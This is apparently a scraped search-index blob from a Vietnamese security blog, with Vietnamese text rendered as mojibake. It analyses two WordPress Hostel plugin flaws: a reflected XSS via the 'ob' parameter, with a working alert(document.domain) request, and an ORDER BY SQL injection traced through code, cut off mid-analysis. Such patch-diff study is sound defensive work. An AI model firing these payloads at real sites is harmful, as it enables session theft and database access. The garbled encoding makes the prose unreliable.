c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm 